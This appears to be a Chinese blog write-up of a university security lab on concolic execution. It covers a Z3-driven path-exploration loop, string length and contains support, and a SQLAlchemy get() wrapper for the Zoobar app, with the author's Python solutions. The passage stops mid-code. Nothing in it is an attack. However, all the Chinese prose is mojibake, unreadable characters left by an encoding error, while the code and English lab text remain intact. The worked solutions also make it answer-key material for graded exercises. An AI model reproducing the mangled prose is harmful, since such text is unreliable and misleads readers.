ä¸ºå·²ç»æ£€æŸ¥è¿‡çš„çº¦æŸï¼Œ<code>outs</code> ä¸ºæœ€åæ±‚è§£æ‰€å¾—ç»“æœï¼Œ<code>inputs</code> ä¸ºå¾…æµ‹è¯•è¾“å…¥é˜Ÿåˆ—ï¼ˆè¾“å…¥ä¸ºå…·ä½“å€¼å­—å…¸ï¼‰</li><li>ç”±ä¸€ä¸ªå¤§å¾ªç¯æŒç»­è°ƒç”¨<code>concolic_exec_input()</code> è®¡ç®—çº¦æŸ</li><li>å°†æ–°çš„çº¦æŸè§£æ·»åŠ åˆ°ç»“æœä¸­</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolic execute func for many different paths and return all</span><br><span class="hljs-comment"># computed results for those different paths.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_execs</span>(<span class="hljs-params">func, maxiter = <span class="hljs-number">100</span>, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## &quot;checked&quot; is the set of constraints we already sent to Z3 for</span><br>  <span class="hljs-comment">## checking.  use this to eliminate duplicate paths.</span><br>  checked = <span class="hljs-built_in">set</span>()<br><br>  <span class="hljs-comment">## output values</span><br>  outs = []<br><br>  <span class="hljs-comment">## list of inputs we should try to explore.</span><br>  inputs = InputQueue()<br><br>  <span class="hljs-built_in">iter</span> = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">while</span> <span class="hljs-built_in">iter</span> &lt; maxiter <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> inputs.empty():<br>    <span class="hljs-built_in">iter</span> += <span class="hljs-number">1</span><br>    concrete_values = inputs.get()<br>    (r, branch_conds, branch_callers) = concolic_exec_input(func, concrete_values, verbose)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> outs:<br>      outs.append(r)<br>    <br>    <span class="hljs-comment">## Exercise 6: your code here.</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ä»£ç éœ€è¦æ·»åŠ åœ¨å¤§å¾ªç¯çš„ååŠéƒ¨åˆ†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹åœ¨ Exercise 3-5 ä¸­æˆ‘ä»¬éƒ½è·å¾—äº†å“ªäº›å¯ç”¨å‡½æ•°ï¼š</p><ul><li><code>concolic_exec_input(testfunc, concrete_values, verbose = 0)</code>ï¼šå°† <code>concrete_values</code> å‚æ•°è®¾ä¸ºå…¨å±€å­—å…¸ï¼Œä¹‹åæ‰§è¡Œç»™å®šçš„å‡½æ•° <code>testfunc</code>ï¼Œè¿”å›æ‰§è¡Œçš„ç»“æœå€¼ã€åˆ†æ”¯æ¡ä»¶åˆ—è¡¨ã€åˆ†æ”¯è°ƒç”¨ä¿¡æ¯åˆ—è¡¨</li><li><code>concolic_find_input(constraint, ok_names, verbose=0)</code>ï¼šä½¿ç”¨ Z3 æ±‚è§£ç»™å®šçº¦æŸï¼Œè¿”å› <code>ok_names</code> åˆ—è¡¨ä¸­å˜é‡çš„å€¼</li><li><code>concolic_force_branch(b, branch_conds, branch_callers, verbose = 1)</code>ï¼šå¯¹ç»™å®šçº¦æŸæ¡ä»¶ <code>branch_conds</code> ä¸åˆ†æ”¯ <code>b</code>ï¼Œè¿”å›èµ°å‘è¯¥åˆ†æ”¯å¦ä¸€è·¯å¾„çš„çº¦æŸ</li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ Lab ç»™çš„æç¤ºä¿¡æ¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 6: your code here.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Here&#x27;s a possible plan of attack:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Iterate over the set of branches returned by concolic_exec_input.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_force_branch() to construct a constraint over</span><br><span class="hljs-comment">##   the inputs for taking the other side of that branch.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - If this constraint is already in the &quot;checked&quot; set, skip</span><br><span class="hljs-comment">##   it (otherwise, add it to prevent further duplicates).</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_find_input() to construct a new input to test,</span><br><span class="hljs-comment">##   based on the above constraint.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Since Z3 might not assign values to every variable</span><br><span class="hljs-comment">##   (such as if that variable turns out to be irrelevant to</span><br><span class="hljs-comment">##   the overall constraint), inherit unassigned values from</span><br><span class="hljs-comment">##   the input that we just tried (i.e., concrete_values).</span><br><span class="hljs-comment">##   You can use the inherit() method in ConcreteValues for this.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Add the input to the queue for processing, along the lines of:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##     inputs.add(new_values, caller)</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##   where caller is the corresponding value from the list of call</span><br><span class="hljs-comment">##   sites returned by concolic_find_input (i.e., branch_callers).</span><br></code></pre></td></tr></table></figure><ul><li>è¿­ä»£ <code>concolic_exec_input()</code> æ‰€è¿”å›çš„åˆ†æ”¯é›†åˆ</li><li>ä½¿ç”¨ <code>concolic_force_branch()</code> æ¥æ„å»ºä¸€ä¸ªåˆ†æ”¯çš„å¦ä¸€è·¯å¾„çº¦æŸ</li><li>è‹¥çº¦æŸå·²ç»åœ¨ <code>check</code> é›†åˆä¸­ï¼Œå°†å…¶è·³è¿‡ï¼Œå¦åˆ™åŠ å…¥é›†åˆä¸­</li><li>ä½¿ç”¨ <code>concolic_find_input()</code> ä»¥æ„å»ºä¸€ä¸ªåŸºäºå¦ä¸€è·¯å¾„çº¦æŸçš„æ–°çš„æµ‹è¯•è¾“å…¥</li><li>Z3 å¯èƒ½ä¸ä¼šä¸ºæ¯ä¸ªå˜é‡åˆ†é…å€¼ï¼ˆä¾‹å¦‚å˜é‡å¯èƒ½ä¸çº¦æŸæ— å…³ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ä»ä¸Šæ¬¡ä½¿ç”¨çš„å­—å…¸ç»§æ‰¿åˆ° <code>concolic_find_input()</code> è¿”å›çš„æ–°å­—å…¸ä¸­ï¼Œå°†æ–°çš„å­—å…¸æ·»åŠ åˆ° <code>input</code> é˜Ÿåˆ—ä¸­</li></ul><p>ä¾ç…§ä»¥ä¸Šæ€è·¯ï¼Œç¬”è€…æœ€ååœ¨å¤§å¾ªç¯æœ«å°¾è¡¥å…¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">branch_len = <span class="hljs-built_in">len</span>(branch_conds)<br><span class="hljs-comment"># explore every branch</span><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(branch_len):<br>  <span class="hljs-comment"># construct new constraint for negative branch</span><br>  cur_constraint = concolic_force_branch(b, branch_conds, branch_callers)<br>  <span class="hljs-comment"># not in `checked` set, solve out the constraint</span><br>  <span class="hljs-keyword">if</span> cur_constraint <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> checked:<br>    checked.add(cur_constraint)<br>    sat, cur_concrete_values = concolic_find_input(cur_constraint, <span class="hljs-literal">None</span>)<br>    <span class="hljs-comment"># satisfiable, add the dict for next round</span><br>    <span class="hljs-keyword">if</span> sat:<br>      cur_concrete_values.inherit(concrete_values)<br>      inputs.add(cur_concrete_values, branch_callers[b])<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 6ï¼š</p><p><img src="https://s2.loli.net/2022/12/19/rSiUjGL92nlzOeb.png" alt="image.png"></p><p>è‡³æ­¤ï¼ŒLab 3 çš„ Part 1 <strong>å…¨éƒ¨å®Œæˆ</strong></p><h2 id="Concolic-execution-for-strings-and-Zoobar"><a href="#Concolic-execution-for-strings-and-Zoobar" class="headerlink" title="Concolic execution for strings and Zoobar"></a>Concolic execution for strings and Zoobar</h2><p>é¦–å…ˆæ˜¯ Exercise 7ï¼Œè¡¥å…¨å¯¹å­—ç¬¦ä¸²ä¸å­—ç¬¦æ•°ç»„çš„ä¸¤ç§è¿ç®—æ”¯æŒï¼šé•¿åº¦ï¼ˆ<code>__len__</code>ï¼‰ä¸åŒ…å«ï¼ˆ<code>__contains__</code>ï¼‰</p><blockquote><p><strong>Exercise 7.</strong> Finish the implementation of concolic execution for strings and byte-arrays in <code>symex/fuzzy.py</code>. We left out support for two operations on <code>concolic_str</code> and <code>concolic_bytes</code> objects. The first is computing the length of a string, and the second is checking whether a particular string <code>a</code> appears in string <code>b</code> (i.e., <code>a</code> is contained in <code>b</code>, the underlying implementation of Pythonâ€™s â€œa in bâ€ construct).</p><p>Look for the comment <code>Exercise 7: your code here</code> to find where you should implement the code for this exercise. We have already implemented the <code>sym_contains</code> and <code>sym_length</code> AST nodes for you, which should come in handy for this exercise.</p><p>Run <strong>.&#x2F;check-concolic-str.py</strong> <em>and</em> <strong>.&#x2F;check-symex-str.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p></blockquote><p>å¯¹äºç¬¦å·å€¼è€Œè¨€è¯¥æ¡†æ¶å·²ç»æä¾›äº†å°è£…å¥½çš„ <code>sym_contains</code> ä¸ <code>sym_length</code> ï¼Œæˆ‘ä»¬åªéœ€è¦å®ç°å¯¹å…·ä½“å€¼çš„åˆ¤æ–­å³å¯ï¼Œè¿™é‡Œåˆ«å¿˜äº†æœ€åçš„è¿”å›å€¼åº”å½“è°ƒç”¨ <code>concolic_bool()</code> ä»¥åœ¨å…¨å±€åˆ—è¡¨ä¸­æ·»åŠ è·¯å¾„çº¦æŸä¸ä¿¡æ¯</p><p>å¾…è¡¥å…¨çš„ä¸¤å¤„çš†ä¸ºä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 7: your code here.</span><br><span class="hljs-comment">## Implement symbolic versions of string length (override __len__)</span><br><span class="hljs-comment">## and contains (override __contains__).</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__len__</span>(<span class="hljs-params">self</span>):<br>  <span class="hljs-keyword">return</span> concolic_int(sym_length(ast(self)), <span class="hljs-built_in">len</span>(self.__v))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__contains__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_str):<br>    res = o.__v <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = o <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">return</span> concolic_bool(sym_contains(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 7ï¼š</p><p><img src="https://s2.loli.net/2022/12/19/CNrSIEkOe54tuoB.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨ Zoobar ä¸­å®Œæˆä¸€ä¸ª <code>concolic HTTP request</code>ï¼Œå› æ­¤å¾…æŸ¥è¯¢çš„ username ä¹Ÿå°†ä¸ºä¸€ä¸ªæ··åˆå€¼ï¼ˆç”± HTTP cookie å¸¦æ¥ï¼‰ï¼Œäºæ˜¯æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨ SQL æŸ¥è¯¢ä¸Šåº”ç”¨æ··åˆæ‰§è¡Œï¼Œä½† SQLite ç”± C è€Œé Python ç¼–å†™ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹å…¶å†…éƒ¨ä»£ç </p><p>äºæ˜¯æ¥ä¸‹æ¥æ¥åˆ° Exercise8ï¼Œå¯¹ SQL çš„ <code>get()</code> åº”ç”¨ä¸€å±‚ wrapper ä»¥å¯¹ SQL è¯­å¥çš„ç»“æœåº”ç”¨æ··åˆæ‰§è¡Œï¼š</p><blockquote><p><strong>Exercise 8.</strong> Figure out how to handle the SQL database so that the concolic engine can create constraints against the data returned by the database. To help you do this, weâ€™ve written an empty wrapper around the sqlalchemy <code>get</code> method, in <code>symex/symsql.py</code>. Implement this wrapper so that concolic execution can try all possible records in a database. Examine <strong>.&#x2F;check-symex-sql.py</strong> to see how we are thinking of performing database lookups on concolic values.</p><p>You will likely need to consult the reference for the <a href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> to understand what the behavior of <code>get</code> should be and what your replacement implementation should be doing.</p><p>Run <strong>.&#x2F;check-symex-sql.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p></blockquote><p>é‚£æˆ‘ä»¬å…ˆçœ‹çœ‹ <code>./check-symex-sql.py</code> é‡Œé¢çš„ä¸»ä½“é€»è¾‘ï¼ˆå…³äº SQLalchemy åº“ç›¸å…³çš„å¯ä»¥å…ˆçœ‹ <a href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> ï¼‰ï¼Œé¦–å…ˆå£°æ˜äº† <code>Test1Base</code> å’Œ <code>Test2Base</code>ï¼Œè¿™ä¸¤ä¸ªç›¸å½“äºä¸¤ç»„ä¸åŒçš„æµ‹è¯•ç”¨ä¾‹ï¼Œæˆ‘ä»¬ä»…åˆ†æå…¶ä¸­ä¸€ç»„å³å¯ï¼Œä¹‹åå®šä¹‰äº†ç±» <code>Test1</code> ç»§æ‰¿è‡ª <code>Test1Base</code>ï¼Œå¹¶ä¸ºè¯¥æ•°æ®åº“è®¾ç½®äº†ä¸¤åˆ—ï¼Œå…¶ä¸­ <code>name</code> ä¸ºä¸»é”®ï¼š</p><blockquote><p>è¿™é‡ŒæŒ‰ç…§ç¬”è€…çš„ç†è§£ï¼Œä¸€ä¸ª <code>Test1</code> å®ä¾‹è¡¨ç¤ºçš„åº”è¯¥æ˜¯åœ¨è¯¥æ•°æ®åº“ä¸­ä¸€è¡Œçš„æ•°æ®</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">Test1Base = declarative_base()<br>Test2Base = declarative_base()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span>(<span class="hljs-title class_ inherited__">Test1Base</span>):<br>    __tablename__ = <span class="hljs-string">&quot;test1&quot;</span><br>    name = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    value = Column(Integer)<br></code></pre></td></tr></table></figure><p>ä¹‹åæ˜¯æ•°æ®åº“åˆå§‹åŒ–å·¥ä½œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbsetup</span>(<span class="hljs-params">name, base</span>):<br>    dbfile = os.path.join(dbdir, <span class="hljs-string">&quot;%s.db&quot;</span> % name)<br>    engine = create_engine(<span class="hljs-string">&#x27;sqlite:///%s&#x27;</span> % dbfile,<br>                           isolation_level=<span class="hljs-string">&#x27;SERIALIZABLE&#x27;</span>)<br>    base.metadata.create_all(engine)<br>    session = sessionmaker(bind=engine)<br>    <span class="hljs-keyword">return</span> session()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test1_setup</span>():<br>    <span class="hljs-keyword">return</span> dbsetup(<span class="hljs-string">&quot;test1&quot;</span>, Test1Base)<br></code></pre></td></tr></table></figure><p>åœ¨ <code>test_f()</code> ä¸­ä¼šè°ƒç”¨ <code>test1_setup()</code> è¿›è¡Œæ•°æ®åº“ <code>&quot;test1&quot;</code> çš„åˆ›å»ºï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæ··åˆå­—ç¬¦ä¸² <code>s</code>ï¼Œå°†å…¶ä½œä¸ºå‚æ•°ç»™åˆ°æ•°æ®åº“çš„ get å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    db = test1_setup()<br>    s = fuzzy.mk_str(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    r = db.query(Test1).get(s)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        v = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">else</span>:<br>        v = r.value<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>query()</code> å±•å¼€æ¥å…¶å®æ˜¯ <code>SELECT test1.nameSELECT test1.name AS test1_name, test1.value AS test1_value FROM test1</code> è¿™æ ·çš„ SQL è¯­å¥ï¼ˆæ¯”è¾ƒç¬¨çš„åŠæ³•å°±æ˜¯å¯ä»¥é€šè¿‡åœ¨ <code>get()</code> ä¸­æ‰“å° <code>query</code> çš„æ–¹å¼æŸ¥çœ‹ï¼‰ï¼Œå…¶ä¸­é€‰æ‹©çš„éƒ½æ˜¯æˆ‘ä»¬ä¸º <code>Test1</code> ç±»æ‰€å®šä¹‰çš„å˜é‡ï¼Œè€Œ <code>get()</code> çš„åŸå§‹ä½œç”¨åˆ™ä¸ºä»æŸ¥è¯¢ç»“æœä¸­é€‰æ‹©ç¬¦åˆæ¡ä»¶çš„ä¸€è¡Œ</p><p>å®Œæˆä¸Šè¿°å®šä¹‰ä¹‹åï¼Œåœ¨æ–‡ä»¶ä¸­é¦–å…ˆè°ƒç”¨ <code>test1_setup()</code> è¿›è¡Œæ•°æ®åº“ <code>&quot;test1&quot;</code> çš„åˆ›å»ºï¼Œå¹¶æ·»åŠ äº†ä¸¤è¡Œæ•°æ®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">t1 = test1_setup()<br>t1a = Test1()<br>t1a.name = <span class="hljs-string">&#x27;foo&#x27;</span><br>t1a.value = <span class="hljs-number">924</span><br>t1.add(t1a)<br>t1b = Test1()<br>t1b.name = <span class="hljs-string">&#x27;barr&#x27;</span><br>t1b.value = <span class="hljs-number">22</span><br>t1.add(t1b)<br>t1.commit()<br></code></pre></td></tr></table></figure><p>æœ€åå¯¹ <code>test_f()</code> åº”ç”¨æ··åˆæ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Testing f..&#x27;</span>)<br>f_results = fuzzy.concolic_execs(test_f, verbose=<span class="hljs-number">10</span>)<br>f_expected = (<span class="hljs-number">924</span>, <span class="hljs-number">22</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(x <span class="hljs-keyword">in</span> f_results <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f_expected):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found all cases for f&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Missing some cases for f:&quot;</span>, <span class="hljs-built_in">set</span>(f_expected) - <span class="hljs-built_in">set</span>(f_results))<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ¥åˆ°æˆ‘ä»¬éœ€è¦è¡¥å…¨ä»£ç çš„ <code>symex/symsql.py</code> å½“ä¸­ï¼Œæ•´ç†é€»è¾‘éå¸¸ç®€å•ï¼Œåªå®šä¹‰äº†ä¸€ä¸ªå¾…æˆ‘ä»¬è¡¥å…¨çš„ <code>newget()</code>ï¼Œå¹¶ç”¨å…¶æ›¿æ¢æ‰äº†åŸæœ‰çš„ <code>get()</code> å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This module wraps SQLalchemy&#x27;s methods to be friendly to</span><br><span class="hljs-comment">## symbolic / concolic execution.</span><br><br><span class="hljs-keyword">import</span> sqlalchemy.orm<br><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> fuzzy<br><br>oldget = sqlalchemy.orm.query.Query.get<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>sqlalchemy.orm.query.Query.get = newget<br></code></pre></td></tr></table></figure><p>å‚æ•° <code>query</code> å…¶å®å°±æ˜¯åé¢åˆ›å»ºçš„ Query å¯¹è±¡ä¸­çš„ <code>self</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹ SQLAlchemy æ–‡æ¡£ä¸­æœ‰æ²¡æœ‰æ¯”è¾ƒæœ‰ç”¨çš„æ–¹æ³•ï¼Œå®é™…ä¸Šåœ¨æ•°æ®åº“çš„ <code>å¢åˆ æ”¹æŸ¥</code> å½“ä¸­ï¼Œå¯¹äºæœ¬é¢˜è€Œè¨€æˆ‘ä»¬åªéœ€è¦å…³æ³¨â€œæŸ¥â€ï¼Œæ³¨æ„åˆ°æœ‰è¿™æ ·ä¸€ä¸ªæ–¹æ³•å¯ä»¥å°†æŸ¥è¯¢ç»“æœä»¥åˆ—è¡¨çš„å½¢å¼è¿”å›ï¼š</p><p><img src="https://s2.loli.net/2022/12/21/CKVXIAh7OWpvobk.png" alt="image.png"></p><p>æ–‡æ¡£é‡Œæ²¡æœ‰ä»”ç»†è¯´æ¸…æ¥šï¼ˆ <del>ä¹Ÿå¯èƒ½æ˜¯ğŸ‘´æ²¡ä»”ç»†çœ‹</del> ï¼‰ï¼Œç¬”è€…å®æµ‹äº†ä¸€ä¸‹ï¼Œè¿”å›çš„åˆ—è¡¨çš„æˆå‘˜çš†ä¸º <code>Test1</code> æˆ– <code>Test2</code> ç±»å‹çš„å¯¹è±¡å®ä¾‹ï¼Œå³ <code>ä¸€è¡Œçš„æ•°æ®</code>ï¼Œè¿™é‡Œæˆ‘ä»¬åŒæ—¶ä¹Ÿå¯ä»¥çœ‹å‡ºåœ¨ <code>test1</code> æ•°æ®åº“ä¸­æœ‰ä¸¤ä¸ª <code>Test1</code>ï¼ˆä¸¤è¡Œï¼‰ï¼Œåˆšå¥½å¯¹åº”ä¸€å¼€å§‹æ·»åŠ è¿›å»çš„ä¸¤è¡Œï¼š</p><p><img src="https://s2.loli.net/2022/12/21/WLK4erN95ngCFil.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å…¶å®å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œ<code>get()</code> çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º <code>primary_key</code>ï¼Œå³æˆ‘ä»¬åªéœ€è¦å¯¹æ¯”æŸ¥è¯¢ç»“æœæ‰¾åˆ°å…¶ä¸­ <code>primary_key</code> çš„å€¼ä¸ä¼ å…¥çš„å‚æ•°å€¼ç›¸åŒçš„é‚£ä¸€è¡Œå¹¶å°†å…¶è¿”å›å³å¯</p><p>åœ¨å¾…æ··åˆæ‰§è¡Œå‡½æ•° <code>test_f()</code> ä¸ <code>test_g()</code> å½“ä¸­ä¼ å…¥çš„ <code>primary_key()</code> çš†ä¸º <code>concolic</code> ç±»å‹å˜é‡ï¼Œè€Œæˆ‘ä»¬å·²ç»å®Œæˆäº† <code>concolic_int</code> ä¸ <code>concolic_str</code> çš„ <code>__cmp__</code> è¿ç®—ç¬¦é‡è½½ï¼Œå› æ­¤åœ¨é‡å†™çš„ get å‡½æ•°ä¸­ç›´æ¥ä½¿ç”¨ <code>==</code> è¿›è¡Œå¯¹æ¯”å³å¯</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶æˆ‘ä»¬çŸ¥é“ <code>Test1</code> çš„ä¸»é”®ä¸º <code>name</code>ï¼Œä½†è¿™é‡Œç›¸æ¯”èµ·ç›´æ¥ä½¿ç”¨ <code>row.name</code>ï¼Œæˆ‘ä»¬éœ€è¦ä¸”åº”å½“å†™ä¸€ä¸ª<strong>æ›´ä¸ºé€šç”¨çš„æ–¹æ³•</strong>ï¼Œåœ¨æ³¨é‡Šä¸­æç¤ºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>r.__table__.primary_key.columns.keys()[0]</code> è·å–ä¸»é”®åçš„å­—ç¬¦ä¸²ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Python çš„å†…ç½®æ–¹æ³• <code>getattr()</code> æ¥è·å–ä¸»é”®çš„å€¼ï¼Œå› æ­¤æœ€åçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  rows = query.<span class="hljs-built_in">all</span>()<br><br>  <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> query.<span class="hljs-built_in">all</span>():<br>    primary_key_in_row = <span class="hljs-built_in">getattr</span>(r, r.__table__.primary_key.columns.keys()[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> 